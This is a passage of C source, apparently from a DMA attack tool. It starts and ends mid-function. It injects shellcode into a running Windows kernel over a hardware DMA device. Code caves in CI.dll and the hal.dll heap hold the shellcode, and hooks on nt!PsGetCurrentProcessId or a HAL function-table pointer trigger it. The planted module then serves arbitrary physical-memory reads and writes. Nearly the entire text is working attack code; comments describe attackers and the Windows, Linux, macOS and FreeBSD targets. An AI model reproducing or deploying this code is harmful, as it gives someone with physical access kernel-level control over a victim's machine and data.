    if(VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE) && paKMD) {
        goto success_kmd_load;
    }
    // ------------------------------------------------------------------------
    // 4: Search for memory map entries between 0xfffff78000000000 - 0xfffff7ffffffffff
    //    i.e. function table in hal.dll heap. Result is address of function pointer to
    //    place hook upon.
    // ------------------------------------------------------------------------
    if(!VMMDLL_Map_GetPteU(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
        printf("KMD: Failed vmm.dll!Map_GetPte #1.\n");
        goto fail;
    }
    pMemMap = LocalAlloc(LMEM_ZEROINIT, cbMemMap);
    if(!pMemMap) { goto fail; }
    if(!VMMDLL_Map_GetPteU(4, pMemMap, &cbMemMap, FALSE)) {
        printf("KMD: Failed vmm.dll!Map_GetPte #2.\n");
        goto fail;
    }
    while(TRUE) {
        i++;
        if((i == pMemMap->cMap) || (pMemMap->pMap[i].vaBase > 0xfffff7ffffffffff)) {
            printf("KMD: Failed locating function hook pointer.\n");
            goto fail;
        }
        if(pMemMap->pMap[i].vaBase < 0xfffff78000000000) { continue; }
        for(j = 0; j < pMemMap->pMap[i].cPages; j++) {
            vaHook = pMemMap->pMap[i].vaBase + (j << 12);
            VMMDLL_MemReadPage(4, vaHook, pbPage);
            if(KMD_Win_SearchTableHalpApicRequestInterrupt(pbPage, vaHook, &dwHookOffset)) {
                vaHook += dwHookOffset;
                goto success_locate_hook; // lvl2 loop breakout with goto
            }
        }
    }
success_locate_hook:
    if(!VMMDLL_MemRead(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD))) {
        printf("KMD: Failed vmm.dll!MemRead #1.\n");
        goto fail;
    }
    // ------------------------------------------------------------------------
    // 5: prepare shellcode
    // ------------------------------------------------------------------------
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE23_VMM", pbExec, sizeof(pbExec), &cbExec);
    *(PQWORD)(pbExec + 0x08) = vaData + 0x08;                   // shellcode atomicity check (cmpxchg_flag address)
    *(PQWORD)(pbExec + 0x10) = qwHookOrig;                      // original (non-hooked) JMP to address
    *(PQWORD)(pbExec + 0x18) = vaData + 0x10;                   // DEBUG data address
    *(PQWORD)(pbExec + 0x20) = vaData;                          // KMDDATA physical address
    *(PQWORD)(pbExec + 0x28) = vaBaseNtoskrnl;                  // NTOSKRNL.EXE virtual address
    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmAllocateContiguousMemory");
    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsCreateSystemThread");
    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmGetPhysicalAddress");
    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "KeGetCurrentIrql");
    *(PQWORD)(pbExec + 0x50) = vaHalBugCheckSystem;
    // ------------------------------------------------------------------------
    // 6: hook and watch for execution & restore
    // ------------------------------------------------------------------------
    qwTMP = 0x0000000025ff9090;
    VMMDLL_MemWrite(4, vaHalBugCheckSystem, (PBYTE)&qwTMP, 8);
    qwTMP = vaExec + 2;
    VMMDLL_MemWrite(4, vaHalBugCheckSystem + 8, (PBYTE)&qwTMP, 8);
    if(!VMMDLL_MemWrite(4, vaExec, pbExec, 0x800) || !VMMDLL_MemRead(4, vaExec, pbExecVerify, 0x800) || memcmp(pbExec, pbExecVerify, 0x800)) {
        printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #2.\n");
        goto fail;
    }
    if(!VMMDLL_MemWrite(4, vaHook, (PBYTE)&vaExec, sizeof(QWORD))) {
        printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #3.\n");
        goto fail;
    }
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(paKMD == 0);
    printf("KMD: Execution received - continuing ...\n");
    VMMDLL_MemWrite(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD));
    VMMDLL_MemWrite(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
    ZeroMemory(pbPage, 0x1000);
    VMMDLL_MemWrite(4, vaData, pbPage, 0x800);
    //------------------------------------------------
    // 7: Set up reference to KMD.
    //------------------------------------------------
success_kmd_load:
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA KMD BASE:  0x%08x\n", (DWORD)paKMD);
    }
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { goto fail; }
    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    ctxMain->pk = ctxMain->phKMD->pk;
    ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
    //------------------------------------------------
    // 8: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        printf("             KMD _may_ still be located at: 0x%08x\n", (DWORD)paKMD);
        KMDClose();
        goto fail;
    }
    ctxMain->cfg.paKMD = ctxMain->phKMD->dwPageAddr32;
    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
    }
    result = TRUE;
fail:
    LocalFree(pSections);
    LocalFree(pMemMap);
    Vmmx_Close();
    return result;
}

/*
* Load a kernel module (KMD) into a Windows 10 system on which not both of
* Vt-d and Virtualization Based Security is enabled. This technique relies
* on analysis by MemProcFS (vmm.dll) which currently only is a Windows module.
* as a result the initial attack may currently only take place from Windows
* attackers.
* The technique puts the executable shellcode inside a code cave inside CI.dll.
* Initial code execution is gained by placing an inline hook in nt!PsGetCurrentProcessId
*/
_Success_(return)
BOOL KMDOpen_WINX64_3_VMM()
{
    BOOL f, fResult = FALSE;
    QWORD vaHook, vaCI, vaDataPre = 0, vaExec = 0;
    DWORD i, cSections, dwHookJMP, paKMD = 0, cbShellcode = 0;
    BYTE pbShellcode[0xc00], pbShellcodeVerify[0xc00], pbHookOriginalData[0x14], pbHook[13] = { 0 }, pbZero20[0x20] = { 0 };
    PIMAGE_SECTION_HEADER pSections = NULL;
    // ------------------------------------------------------------------------
    // 1: Initialize MemProcFS/vmm.dll
    // ------------------------------------------------------------------------
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("KMD: Failed initializing required MemProcFS/vmm.dll #1\n");
        return FALSE;
    }
    // ------------------------------------------------------------------------
    // 2: Load Signature.
    // ------------------------------------------------------------------------
    if(!Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE23_VMM3", pbShellcode, sizeof(pbShellcode), &cbShellcode)) { goto fail; }
    // ------------------------------------------------------------------------
    // 3: Locate locations where to insert
    //    code: (CI.dll 'INIT'  section)
    //    data: (CI.dll '.data' section)
    //    hook: (nt!PsGetCurrentProcessId)
    // ------------------------------------------------------------------------
    f = (vaCI = VMMDLL_ProcessGetModuleBaseU(4, "CI.dll")) &&
        VMMDLL_ProcessGetSectionsU(4, "CI.dll", NULL, 0, &cSections) &&
        cSections &&
        (pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER))) &&
        VMMDLL_ProcessGetSectionsU(4, "CI.dll", pSections, cSections, &cSections);
    for(i = 0; f && (i < cSections); i++) {
        if(!strcmp("INIT", pSections[i].Name)) {
            vaExec = vaCI + pSections[i].VirtualAddress + 0x400;
        }
        if(!strcmp(".data", pSections[i].Name)) {
            vaDataPre = ((vaCI + pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x20;
        }
    }
    if(!f || !vaExec || !vaDataPre) {
        printf("KMD: Failed get code cave (CI.dll) #2\n");
        goto fail;
    }
    f = (vaHook = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsGetCurrentProcessId")) &&
        VMMDLL_MemRead(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
    if(!f) {
        printf("KMD: Failed get hook (ntoskrnl.exe) #3\n");
        goto fail;
    }
    if((pbHookOriginalData[0x00] == 0xE9)) {
        printf("KMD: Hook already inserted #4\n");
        goto fail_hookrestore;
    }
    // ------------------------------------------------------------------------
    // 4: Prepare and Inject!
    // ------------------------------------------------------------------------
    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "KeGetCurrentIrql")) &&
        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsCreateSystemThread")) &&
        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "ZwClose")) &&
        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmGetPhysicalAddress")) &&
        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBaseU(4, "ntoskrnl.exe"));
    if(!f) {
        printf("KMD: Failed get functions (ntoskrnl.exe) #5\n");
        goto fail;
    }
    *(PQWORD)(pbShellcode + 0x018) = vaDataPre;
    memcpy(pbShellcode + 0x004, pbHookOriginalData, sizeof(pbHookOriginalData));
    if(!VMMDLL_MemWrite(4, vaExec, pbShellcode, cbShellcode) || !VMMDLL_MemRead(4, vaExec, pbShellcodeVerify, cbShellcode) || memcmp(pbShellcode, pbShellcodeVerify, cbShellcode)) {
        printf("KMD: Failed MemWrite (CI.dll) #6\n");
        goto fail;
    }
    if((vaHook - vaExec > 0x7fff0000) && (vaExec - vaHook > 0x7fff0000)) {
        // ABSOLUTE JMP [MOV r10, addr + JMP r10]
        pbHook[0] = 0x49;
        pbHook[1] = 0xBA;
        *(PQWORD)(pbHook + 2) = vaExec;
        pbHook[10] = 0x41;
        pbHook[11] = 0xFF;
        pbHook[12] = 0xE2;
    } else {
        // RELATIVE JMP
        pbHook[0] = 0xE9;   // JMP
        *(PDWORD)(pbHook + 1) = (dwHookJMP = (DWORD)(vaExec - (vaHook + 5ULL)));
    }
    if(!VMMDLL_MemWrite(4, vaHook, pbHook, sizeof(pbHook))) {
        printf("KMD: Failed MemWrite (ntoskrnl.exe) #7\n");
        goto fail;
    }
    // ------------------------------------------------------------------------
    // 5: Wait for execution.
    // ------------------------------------------------------------------------
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!VMMDLL_MemReadEx(4, vaDataPre + 0x1c, (PBYTE)&paKMD, sizeof(DWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail_hookrestore;
        }
    } while(paKMD == 0);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Set up reference to KMD.
    //------------------------------------------------
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA KMD BASE:  0x%08x\n", (DWORD)paKMD);
    }
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { goto fail; }
    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    ctxMain->pk = ctxMain->phKMD->pk;
    ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
    //------------------------------------------------
    // 7: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        printf("             KMD _may_ still be located at: 0x%08x\n", (DWORD)paKMD);
        KMDClose();
        goto fail_hookrestore;
    }
    ctxMain->cfg.paKMD = ctxMain->phKMD->dwPageAddr32;
    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
    }
    fResult = TRUE;
fail_hookrestore:
    VMMDLL_MemWrite(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
    VMMDLL_MemWrite(4, vaDataPre, pbZero20, sizeof(pbZero20));
fail:
    LocalFree(pSections);
    Vmmx_Close();
    return fResult;
}

// https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
// HAL is statically located at: ffffffffffd00000 (win8.1/win10 pre 1703)
// HAL is randomized between: fffff78000000000:fffff7ffc0000000 (win10 1703) [512 possible positions in PDPT]
_Success_(return)
BOOL KMDOpen_HalHijack()
{
    DWORD ADDR_HAL_HEAP_PA = 0x00001000;
    //QWORD ADDR_SHELLCODE_VA = 0xffffffffffc00100;
    BOOL result, fResult = FALSE;
    PSIGNATURE pSignature = NULL;
    PDWORD pdwPhysicalAddress;
    BYTE pbHal[0x1000] = { 0 }, pbPT[0x1000] = { 0 }, pbNULL[0x300] = { 0 };
    DWORD dwHookFnPgOffset;
    QWORD qwPML4, qwHalVA, qwAddrHalHeapVA, qwPTEOrig, qwPTEPA, qwPTPA, qwShellcodeVA;
    //------------------------------------------------
    // 1: Fetch hal.dll heap and perform sanity checks.
    //------------------------------------------------
    if(!(pSignature = LocalAlloc(0, sizeof(SIGNATURE)))) { goto fail; }
    Util_CreateSignatureWindowsHalGeneric(pSignature);
    result = DeviceReadDMA_Retry(ctxMain->hLC, ADDR_HAL_HEAP_PA, 0x1000, pbHal);
    qwPML4 = *(PQWORD)(pbHal + 0xa0);
    qwHalVA = *(PQWORD)(pbHal + 0x78);
    if(!result || (qwPML4 & 0xffffffff00000fff)) {
        printf("KMD: Failed. Error reading or interpreting memory #1.\n");
        goto fail;
    }
    if(((qwHalVA & 0xfffffffffff00fff) != 0xffffffffffd00000) && ((qwHalVA & 0xffffff803fe00fff) != 0xfffff78000000000)) {
        printf("KMD: Failed. Error reading or interpreting memory #2.\n");
        goto fail;
    }
    result = Util_PageTable_ReadPTE(qwPML4, qwHalVA, &qwPTEOrig, &qwPTEPA);
    if(!result || ((qwPTEOrig & 0x00007ffffffff003) != 0x1003)) {
        printf("KMD: Failed. Error reading or interpreting PTEs.\n");
        goto fail;
    }
    //------------------------------------------------
    // 2: Search for function table in hal.dll heap.
    //------------------------------------------------
    result = FALSE;
    for(qwAddrHalHeapVA = (qwHalVA & 0xffffffffffd00000); qwAddrHalHeapVA < (qwHalVA & 0xffffffffffd00000) + 0x100000; qwAddrHalHeapVA += 0x1000) {
        result =
            Util_PageTable_ReadPTE(qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
            ((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
            DeviceReadDMA_Retry(ctxMain->hLC, (qwPTEOrig & 0xfffff000), 0x1000, pbHal) &&
            KMD_Win_SearchTableHalpApicRequestInterrupt(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
        if(result) {
            break;
        }
    }
    if(!result) {
        printf("KMD: Failed. Failed finding entry point.\n");
        goto fail;
    }
    qwPTPA = qwPTEPA & ~0xfff;
    result = DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 0x1000, pbPT);
    if(!result || memcmp(pbPT + 0x200, pbNULL, 0x300)) { // 0x300 bytes between 0x200:0x500 in Hal PT must be zero
        printf("KMD: Failed. Error reading or interpreting PT.\n");
        goto fail;
    }
    qwShellcodeVA = (qwAddrHalHeapVA & 0xffffffffffe00000) + 0x40000 + 0x210;
    //------------------------------------------------
    // 3: Write shellcode into page table empty space.
    //------------------------------------------------
    *(PQWORD)(pbPT + 0x200) = qwPTPA | 0x63; // PTE for addr
    memcpy(pbPT + 0x210, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
    *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
    *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
    DeviceWriteDMA_Retry(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbPT + 0x200);
    Util_PageTable_SetModeX(qwPML4, qwShellcodeVA);
    //------------------------------------------------
    // 4: Place hook by overwriting function addr in hal.dll heap.
    //------------------------------------------------
    Sleep(250);
    DeviceWriteDMA_Retry(ctxMain->hLC, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, sizeof(QWORD), (PBYTE)&qwShellcodeVA);
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA PT BASE:   0x%016llx\n", qwPML4);
        printf("INFO: PA PT:        0x%016llx\n", qwPTPA);
        printf("INFO: PA HAL HEAP:  0x%016llx\n", (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset);
        printf("INFO: VA SHELLCODE: 0x%016llx\n", qwShellcodeVA);
    }
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    //------------------------------------------------
    // 5: wait for patch to reveive execution.
    //------------------------------------------------
    pdwPhysicalAddress = (PDWORD)(pbPT + 0x210 + STAGE2_OFFSET_STAGE3_PHYSADDR);
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 4096, pbPT)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Restore hooks to original.
    //------------------------------------------------
    Sleep(250);
    LcWrite(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbNULL);
    //------------------------------------------------
    // 7: Set up kernel module shellcode (stage3) and finish.
    //------------------------------------------------
    fResult = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
fail:
    LocalFree(pSignature);
    return fResult;
}

//-------------------------------------------------------------------------------
// KMD command function below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _In_ QWORD qwNumberOfBytes)
{
    QWORD i;
    PHYSICAL_MEMORY_RANGE pmr;
    for(i = 0; i < phKMD->cPhysicalMap; i++) {
        pmr = phKMD->pPhysicalMap[i];
        if(((pmr.BaseAddress <= qwBaseAddress) && (pmr.BaseAddress + pmr.NumberOfBytes >= qwBaseAddress + qwNumberOfBytes))) {
            return TRUE;
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_SubmitCommand(_In_ QWORD op)
{
    DWORD cFailCount;
    HANDLE hCallback = NULL;
    ctxMain->pk->_op = op;
    if(!LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
        return FALSE;
    }
    do {
        cFailCount = 0;
        while(!DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
            cFailCount++;
            if(cFailCount < 10) { usleep(250); continue; }
            if(cFailCount < 20) { SwitchToThread(); continue; }
            if(cFailCount < 30) { Sleep(100); continue; }
            Exec_CallbackClose(hCallback);
            return FALSE;
        }
        if((op != KMD_CMD_TERMINATE) && (op != KMD_CMD_MEM_INFO) && (!ctxMain->pk || ((ctxMain->pk->MAGIC != KMDDATA_MAGIC) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC_PARTIAL)))) {
            printf("PCILEECH: FAIL: KMDDATA corruption! - bit errors? Address: 0x%08x. Terminating.\n", ctxMain->phKMD->dwPageAddr32);
            LcClose(ctxMain->hLC);
            ExitProcess(0);
        }
        if(ctxMain->pk->_op == KMD_CMD_EXEC_EXTENDED) {
            Exec_Callback(&hCallback);
        }
    } while(((ctxMain->pk->_op != KMD_CMD_COMPLETED) || (ctxMain->pk->_status != 1)) && ctxMain->pk->_status < 0x0fffffff);
    if(hCallback) { Exec_CallbackClose(hCallback); }
    return TRUE;
}

VOID KMD_PhysicalMemoryMapDisplay(_In_ PKMDHANDLE phKMD)
{
    QWORD i;
    PHYSICAL_MEMORY_RANGE pmr;
    printf("Kernel reported memory map below:\n START              END               #PAGES\n");
    for(i = 0; i < phKMD->cPhysicalMap; i++) {
        pmr = phKMD->pPhysicalMap[i];
        printf(
            " %016llx - %016llx  %08llx\n",
            pmr.BaseAddress,
            pmr.BaseAddress + pmr.NumberOfBytes - 1,
            pmr.NumberOfBytes / 0x1000);
    }
    printf("----------------------------------------------\n");
}

_Success_(return)
BOOL KMD_GetPhysicalMemoryMap()
{
    QWORD qwMaxMemoryAddress;
    KMD_SubmitCommand(KMD_CMD_MEM_INFO);
    if(!ctxMain->pk->_result || !ctxMain->pk->_size) { return FALSE; }
    ctxMain->phKMD->pPhysicalMap = LocalAlloc(LMEM_ZEROINIT, (ctxMain->pk->_size + 0x1000) & 0xfffff000);
    if(!ctxMain->phKMD->pPhysicalMap) { return FALSE; }
    DeviceReadDMA(ctxMain->pk->DMAAddrPhysical, (DWORD)((ctxMain->pk->_size + 0x1000) & 0xfffff000), (PBYTE)ctxMain->phKMD->pPhysicalMap, NULL);
    ctxMain->phKMD->cPhysicalMap = ctxMain->pk->_size / sizeof(PHYSICAL_MEMORY_RANGE);
    if(ctxMain->phKMD->cPhysicalMap > 0x2000) { return FALSE; }
    // adjust max memory according to physical memory
    qwMaxMemoryAddress = ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].BaseAddress;
    qwMaxMemoryAddress += ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].NumberOfBytes;
    if(qwMaxMemoryAddress > 0x0000ffffffffffff) { return FALSE; }
    if((ctxMain->cfg.paAddrMax == 0) || (ctxMain->cfg.paAddrMax > qwMaxMemoryAddress)) {
        ctxMain->cfg.paAddrMax = qwMaxMemoryAddress - 1;
    }
    if(ctxMain->cfg.fVerbose) {
        KMD_PhysicalMemoryMapDisplay(ctxMain->phKMD);
    }
    return TRUE;
}

_Success_(return)
BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3)
{
    //------------------------------------------------
    // 1: Set up kernel module shellcode (stage3)
    //------------------------------------------------
    if(dwPhysicalAddress == 0xffffffff) {
        printf("KMD: Failed. Stage2 shellcode error.\n");
        return FALSE;
    }
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: PA KMD BASE:  0x%08x\n", dwPhysicalAddress);
    }
    LcWrite(ctxMain->hLC, dwPhysicalAddress + 0x1000ULL, cbStage3, pbStage3);
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { return FALSE; }
    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    ctxMain->pk = ctxMain->phKMD->pk;
    ctxMain->phKMD->dwPageAddr32 = dwPhysicalAddress;
    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
    //------------------------------------------------
    // 2: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        KMDClose();
        return FALSE;
    }
    ctxMain->cfg.paKMD = ctxMain->phKMD->dwPageAddr32;
    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
    }
    return TRUE;
}

_Success_(return)
BOOL KMDReadMemory_DMABufferSized(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
    BOOL result;
    if(!KMD_IsRangeInPhysicalMap(ctxMain->phKMD, qwAddress, cb) && !ctxMain->cfg.fForceRW) { return FALSE; }
    ctxMain->pk->_size = cb;
    ctxMain->pk->_address = qwAddress;
    result = KMD_SubmitCommand(KMD_CMD_VOID);
    if(!result) { return FALSE; }
    result = KMD_SubmitCommand(KMD_CMD_READ);
    if(!result) { return FALSE; }
    return (cb == DeviceReadDMA(ctxMain->pk->DMAAddrPhysical, cb, pb, NULL)) && ctxMain->pk->_result;
}

_Success_(return)
BOOL KMDWriteMemory_DMABufferSized(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
{
    BOOL result;
    if(!KMD_IsRangeInPhysicalMap(ctxMain->phKMD, qwAddress, cb) && !ctxMain->cfg.fForceRW) { return FALSE; }
    result = LcWrite(ctxMain->hLC, ctxMain->pk->DMAAddrPhysical, cb, pb);
    if(!result) { return FALSE; }
    ctxMain->pk->_size = cb;
    ctxMain->pk->_address = qwAddress;
    result = KMD_SubmitCommand( KMD_CMD_VOID);
    if(!result) { return FALSE; }
    return KMD_SubmitCommand(KMD_CMD_WRITE) && ctxMain->pk->_result;
}

_Success_(return)
BOOL KMDReadMemory(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
    DWORD dwDMABufferSize = (DWORD)ctxMain->pk->DMASizeBuffer;
    DWORD o = cb;
    dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
    while(TRUE) {
        if(o <= dwDMABufferSize) {
            return KMDReadMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, o);
        } else if(!KMDReadMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
            return FALSE;
        }
        o -= dwDMABufferSize;
    }
}

_Success_(return)
BOOL KMDWriteMemory(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
{
    DWORD dwDMABufferSize = (DWORD)ctxMain->pk->DMASizeBuffer;
    DWORD o = cb;
    dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
    while(TRUE) {
        if(o <= dwDMABufferSize) {
            return KMDWriteMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, o);
        } else if(!KMDWriteMemory_DMABufferSized(qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
            return FALSE;
        }
        o -= dwDMABufferSize;
    }
}

VOID KMDUnload()
{
    if(ctxMain->phKMD) {
        KMD_SubmitCommand(KMD_CMD_TERMINATE);
        KMDClose();
    }
}

VOID KMDClose()
{
    if(ctxMain->phKMD) {
        LocalFree(ctxMain->phKMD->pPhysicalMap);
        LocalFree(ctxMain->phKMD);
        ctxMain->phKMD = NULL;
        ctxMain->pk = NULL;
    }
}

_Success_(return)
BOOL KMDOpen_MemoryScan()
{
    PSIGNATURE pSignature = NULL, pSignatures = NULL;
    DWORD dwSignatureMatchIdx, cSignatures = CONFIG_MAX_SIGNATURES;
    PKMDHANDLE_S12 ph1 = NULL, ph2 = NULL;
    PDWORD pdwPhysicalAddress;
    BOOL fResult = FALSE;
    if(!(ph1 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
    if(!(ph2 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
    if(!(pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE)))) { goto fail; }
    //------------------------------------------------
    // 1: Load signature
    //------------------------------------------------
    if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_46")) {
        if(!KMD_Linux46KernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic linux kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_48")) {
        if(!KMD_Linux48KernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic linux kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else if((0 == _stricmp(ctxMain->cfg.szKMDName, "MACOS")) || (0 == _stricmp(ctxMain->cfg.szKMDName, "OSX_X64"))) {
        if(!KMD_MacOSKernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic macOS kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "FREEBSD_X64")) {
        if(!KMD_FreeBSDKernelSeekSignature(&pSignatures[0])) {
            printf("KMD: Failed. Error locating generic FreeBSD kernel signature.\n");
            goto fail;
        }
        pSignature = &pSignatures[0];
    } else {
        if(!Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", pSignatures, &cSignatures, 5)) {
            printf("KMD: Failed. Error loading signatures.\n");
            goto fail;
        }
        //------------------------------------------------
        // 2: Locate patch location (scan memory).
        //------------------------------------------------
        if(!KMD_FindSignature1(pSignatures, cSignatures, &dwSignatureMatchIdx)) {
            printf("KMD: Failed. Could not find signature in memory.\n");
            goto fail;
